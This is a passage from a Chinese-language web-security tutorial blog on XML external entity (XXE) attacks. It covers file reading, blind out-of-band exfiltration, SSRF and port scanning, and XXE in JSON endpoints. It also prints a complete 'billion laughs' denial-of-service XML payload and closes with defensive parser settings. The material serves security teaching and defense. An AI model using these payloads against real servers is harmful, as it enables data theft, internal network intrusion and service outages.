title="XXE危害"></a><strong>XXE危害</strong></h1><p>文件读取、拒绝服务攻击、命令执行、SQL注入、XSS、内网扫描端口、入侵内网站点等。</p><p>两大利用场景：有回显、无回显。</p><p>有回显：可以直接在页面中看到Payload的执行结果或者通过报错获取有用信息</p><p>无回显：又称为Blind XXE。</p><h2 id="读取敏感文件-x2F-列举目录"><a href="#读取敏感文件-x2F-列举目录" class="headerlink" title="读取敏感文件&#x2F;列举目录"></a><strong>读取敏感文件&#x2F;列举目录</strong></h2><p>直接读取本地文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201152526.png"></p><p>引入外部实体读取本地文件。有些XML解析库还支持列目录。比如java的file协议，可逐层获取目录结构和文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201152620.png"></p><p>若文件中包含”&lt;“或”&amp;”等符号时，XML解析不了，需要改变编码，例如php伪协议。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201153655.png"></p><p>或者在引用的时候利用CDATA给所读文件添加属性：不被解析。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201154101.png"></p><h2 id="入侵内网站点"><a href="#入侵内网站点" class="headerlink" title="入侵内网站点"></a><strong>入侵内网站点</strong></h2><p>利用支持的协议进行内网主机和端口发现。</p><p>端口扫描，看报错信息或响应时间。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201154546.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201154609.png"></p><p>拿目标服务器当跳板。解析器对URL有一定限制，只要有回车换行（测试发现php中空格等制表符也不允许），都会被检查为不合法URL，直接拦截这个请求，需要根据情况用其他符号代替。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201155019.png"></p><p>若禁用外部实体引用，大多数攻击会失效，但SSRF不会。可以利用DOCTYPE请求外部资源。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201155211.png"></p><h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a><strong>拒绝服务攻击</strong></h2><p>“billion laughs”攻击，请求复杂的XML定义，在内存中生成大量字符串，耗尽服务器可用内存，导致DoS攻击。</p><p>正常请求。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201155717.png"></p><p>构造恶意代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201155727.png"></p><p>与正常请求相比，构造恶意XML使服务器解析变的很慢。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201155747.png"></p><h2 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a><strong>执行任意命令</strong></h2><p>某些协议可直接执行系统命令，如在安装expect扩展的PHP环境里执行系统命令（这个扩展并不是默认安装的）。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201160111.png"></p><h2 id="文件上传（jar-url协议）"><a href="#文件上传（jar-url协议）" class="headerlink" title="文件上传（jar url协议）"></a><strong>文件上传（jar url协议）</strong></h2><p>无论外部实体是否开启都能进行攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201193152.png"></p><h1 id="XXE高级利用方式"><a href="#XXE高级利用方式" class="headerlink" title="XXE高级利用方式"></a><strong>XXE高级利用方式</strong></h1><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a><strong>Blind XXE</strong></h2><p>若发现没有回显，可能是因为：</p><ol><li>服务器禁止了外部实体引用。</li><li>服务器进行了过滤或者展示限制。</li></ol><p>若是第二种，就可能出现Blind XXE，Blind XXE主要以参数实体为核心，使用OOB在远程服务器上提取文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201161823.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201161835.png"></p><p>由于不回显，则可以通过HTTP、ftp、gopher等协议OOB。</p><p>Payload：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201162741.png"></p><p>evil.xml：</p><p>其中c也可以换成普通实体写法。XML头可有可无，可能绕过过滤。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201162819.png"></p><p>服务器上监听接受到http数据，base64解码即可。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201162950.png"></p><p>也可以调整一下Payload写法，将数据写入文件输出。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201163016.png"></p><p>或者看服务器日志记录，方法各异。也可以利用dnslog查看数据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201163202.png"></p><p>更容易获取数据方法，通过加入非法URI到请求上面强制服务器产生错误。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201163310.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201163321.png"></p><p>或者在构造不同的外部实体时出现的其他错误。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201163327.png"></p><h2 id="JSON中的XXE"><a href="#JSON中的XXE" class="headerlink" title="JSON中的XXE"></a><strong>JSON中的XXE</strong></h2><p>当WEB服务使用JSON进行传输时，若服务器上的JSON解析器的配置不完善，服务器可能会接收XML数据格式，遭受XXE攻击。ps：不是每一个JSON终端都会接收XML格式。</p><p>用一道CTF题举例，目标是获取&#x2F;home&#x2F;ctf&#x2F;flag.txt的内容。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201165254.png"></p><p>若Content-Type头被修改为application&#x2F;xml，客户端会告诉服务器post过去的数据是XML格式的。若实际传过去的不是该格式的话，服务器不会进行解析，会报错、返回500状态码或返回空数据等，这得看服务器的配置。比如提示”errorMessage:org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.”则表示服务器能够处理XML格式和JSON格式的数据。</p><p>修改Content-Type，将json格式数据转换成XML格式。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201165701.png"></p><p>JSON转换为XML的攻击不会只限制于通过POST传输带有JSON内容的payload，可以尝试利用GET方法传输。</p><h1 id="如何分辨XXE"><a href="#如何分辨XXE" class="headerlink" title="如何分辨XXE"></a><strong>如何分辨XXE</strong></h1><ol><li><p>看能否解析实体，是否有过滤DOCTYPE等关键字。若不能回显有可能是因为构造payload时删除了过多原来的代码导致错误。或者直接使用Blind XXE。</p></li><li><p>看能否引用外部实体。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201190754.png"></p><p>这里服务器可能会报错或者返回空数据返回500等等，但是若HTTP请求能发送出去，这就说明漏洞存在。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210201190805.png"></p></li><li><p>有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，若这样的话，使用Blind XXE方法。</p></li></ol><h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a><strong>如何防御</strong></h1><ol><li><p>禁用外部实体的引用。</p><p>配置XML处理器去使用本地静态的DTD。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true)</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance()</span><br><span class="line">dbf.setExpandEntityReferences(false)</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p>过滤用户提交的XML数据。</p><p>使用一个标准DTD模板，校验从外部接受来的XML数据是否有效。过滤如&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC等关键词。</p></li><li><p>升级Libxml库。</p><p>XML文件的解析依赖libxml库，libxml2.9以前的版本默认支持并开启了外部实体的引用，Libxml2.9默认防御XML外部实体注入。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOB </tag>
            
            <tag> XML </tag>
            
            <tag> 外部实体 </tag>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
